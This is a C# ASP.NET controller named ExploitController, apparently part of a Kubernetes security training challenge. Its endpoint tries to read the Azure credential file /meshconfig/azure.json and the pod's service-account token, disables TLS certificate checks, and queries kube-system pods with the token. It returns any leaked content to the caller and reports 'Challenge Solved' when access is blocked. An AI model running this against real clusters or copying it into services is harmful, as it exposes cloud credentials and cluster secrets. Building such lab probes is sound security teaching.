using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;

namespace TeamGameHub.GameEngine.Sidecar.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class ExploitController : ControllerBase
    {
        private readonly ILogger<ExploitController> _logger;
        private readonly HttpClient _httpClient;
        private readonly string _kubeApiUri;
        private readonly HttpClientHandler _clientHandlerForUnsecureTraffic;

        public ExploitController(ILogger<ExploitController> logger)
        {

            _clientHandlerForUnsecureTraffic = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
            };

            _logger = logger;
            _httpClient = new HttpClient(_clientHandlerForUnsecureTraffic);
            _kubeApiUri = "https://" + Environment.GetEnvironmentVariable("KUBERNETES_SERVICE_HOST") + ":" + Environment.GetEnvironmentVariable("KUBERNETES_SERVICE_PORT") + "/"; ;
            _httpClient.BaseAddress = new Uri(_kubeApiUri);
            Console.WriteLine("Kubernetes API running at " + _kubeApiUri);
        }

        [HttpGet]
        public async Task<object> GetAsync()
        {

            // check for access to /meshconfig/azure.json
            string exploitedMeshContent;
            bool meshconfigExploited;
            try
            {
                exploitedMeshContent = System.IO.File.ReadAllText("/meshconfig/azure.json");
                meshconfigExploited = true;
            }
            catch (Exception)
            {
                exploitedMeshContent = "Challenge Solved: Can't access file /meshconfig/azure.json";
                meshconfigExploited = false;
                Console.WriteLine(exploitedMeshContent);
            }

            // try to access kubeapi
            string token = System.IO.File.ReadAllText("/var/run/secrets/kubernetes.io/serviceaccount/token");
            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
            HttpResponseMessage podRequestResult = await _httpClient.GetAsync("api/v1/namespaces/kube-system/pods");

            string exploitedPodList;
            bool podListExploited;
            if (podRequestResult.StatusCode.Equals(HttpStatusCode.Forbidden))
            {
                exploitedPodList = "Challenge Solved: Can't access KubeApi - 403!";
                podListExploited = false;
                Console.WriteLine("Can't access KubeApi");
            }
            else
            {
                exploitedPodList = await podRequestResult.Content.ReadAsStringAsync();
                podListExploited = true;
            }

            var result = new
            {
                meshconfigExploited,
                exploitedMeshContent,
                podListExploited,
                exploitedPodList
            };
            return result;
        }
    }
}
